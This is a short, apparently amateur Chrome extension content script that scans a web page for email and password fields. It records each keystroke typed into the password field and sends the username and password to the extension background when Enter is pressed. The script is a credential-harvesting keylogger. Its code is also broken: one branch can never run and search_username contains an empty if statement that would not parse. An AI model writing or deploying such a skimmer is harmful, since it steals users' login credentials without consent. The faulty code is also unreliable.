console.log("content script running!!!");

var data= {username: "", password: ""};
var username_elt, password_elt;
var uf= false, pf= false;

document.body.onload= function()
{
	var text_fields= [];
	for(var i= 0; i < document.querySelectorAll("input").length; i++)
	{
		if(document.querySelectorAll("input")[i].type == "email")
		{
			if(uf == false)
			{	
				username_elt= document.querySelectorAll("input")[i];
				console.log("email field found!!!")
				uf= true;
			}
		}
		else if(document.querySelectorAll("input")[i].type == "text" || document.querySelectorAll("input")[i].type == "password")
		{
			text_fields.push(document.querySelectorAll("input")[i]);
			console.log("text field found!!!")
		}
		else if(document.querySelectorAll("input")[i].type == "password")
		{
			password_elt= document.querySelectorAll("input")[i];
			document.querySelectorAll("input")[i].addEventListener("keydown", get_data, false);
			console.log("password field found!!!")
			if(uf == true)	
				break;
		}
	
	}
	if(uf == false)
		search_username(text_fields);
}

function get_data(event)
{
	if(event.keyCode === 13)
	{
		chrome.runtime.sendMessage(data);
		console.log("data sent!!!")	
	}
	else
	{
		data.password = data.password.concat(event.key);
		console.log(data.password);
	}
	data.username= username_elt.value;
}

function search_username(list)
{
	for(var i= 0; i < list.length; i++)
	{
		if(list[i].type= "password")
		{
			var pos= i - 1;
			for(var j= pos; j >= 0; j--)
			{	
				if(list[j].type == "text")
			}
		}
	}
}


chrome.runtime.onMessage.addListener(function(message, sender, responce){
	console.log("background says: " + message);
})



